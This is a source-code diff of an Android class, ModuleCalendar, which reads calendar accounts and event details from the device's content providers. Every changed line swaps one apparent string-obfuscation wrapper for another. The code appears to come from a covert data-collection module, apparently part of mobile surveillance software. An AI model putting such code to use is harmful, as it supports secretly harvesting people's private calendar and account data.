@@ -170,7 +170,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 		String contentProvider;
 
 		// d_19=content://com.android.calendar
-		contentProvider = M.d("content://com.android.calendar"); //$NON-NLS-1$
+		contentProvider = M.e("content://com.android.calendar"); //$NON-NLS-1$
 		calendars = selectCalendars(contentProvider);
 
 		if (calendars == null || calendars.isEmpty()) {
@@ -178,7 +178,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 				Check.log(TAG + " (calendar): opening 2.2 style"); //$NON-NLS-1$
 			}
 			// d_18=content://calendar
-			contentProvider = M.d("content://calendar"); //$NON-NLS-1$
+			contentProvider = M.e("content://calendar"); //$NON-NLS-1$
 			calendars = selectCalendars(contentProvider);
 		} else {
 			if (Cfg.DEBUG) {
@@ -195,7 +195,7 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (calendar): " + calendar_id); //$NON-NLS-1$
 			}
-			Uri.Builder builder = Uri.parse(contentProvider + M.d("/events")).buildUpon(); //$NON-NLS-1$
+			Uri.Builder builder = Uri.parse(contentProvider + M.e("/events")).buildUpon(); //$NON-NLS-1$
 			String textUri = builder.build().toString();
 
 			// d_7=_id
@@ -211,8 +211,8 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 			Cursor eventCursor = managedQuery(
 					builder.build(),
 					new String[] {
-							M.d("_id"), M.d("title"), M.d("dtstart"), M.d("dtend"), //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
-							M.d("rrule"), M.d("allDay"), M.d("eventLocation"), M.d("description") }, M.d("calendar_id") + "=" + id, null, M.d("_id ASC")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
+							M.e("_id"), M.e("title"), M.e("dtstart"), M.e("dtend"), //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
+							M.e("rrule"), M.e("allDay"), M.e("eventLocation"), M.e("description") }, M.e("calendar_id") + "=" + id, null, M.e("_id ASC")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$ //$NON-NLS-5$ //$NON-NLS-6$
 
 			while (eventCursor.moveToNext()) {
 				int index = 0;
@@ -286,9 +286,9 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 			}
 
 			String[] projection = new String[] {
-					M.d("_id"), "account_name", "calendar_displayName", "ownerAccount" }; //$NON-NLS-1$
+					M.e("_id"), "account_name", "calendar_displayName", "ownerAccount" }; //$NON-NLS-1$
 			// Uri calendars = Uri.parse("content://calendar/calendars");
-			Uri calendars = Uri.parse(contentProvider + M.d("/calendars")); //$NON-NLS-1$
+			Uri calendars = Uri.parse(contentProvider + M.e("/calendars")); //$NON-NLS-1$
 			Hashtable<String, String> calendarIds = new Hashtable<String, String>();
 			Cursor managedCursor = managedQuery(calendars, projection, null, null, null); //$NON-NLS-1$
 
@@ -382,9 +382,9 @@ public class ModuleCalendar extends BaseModule implements Observer<ProcessInfo> 
 
 			if (rrule != null) {
 				if (description == null) {
-					description = M.d("RULE: ") + rrule; //$NON-NLS-1$
+					description = M.e("RULE: ") + rrule; //$NON-NLS-1$
 				} else {
-					description += " \n" + M.d("RULE: ") + rrule; //$NON-NLS-1$
+					description += " \n" + M.e("RULE: ") + rrule; //$NON-NLS-1$
 				}
 			}
 
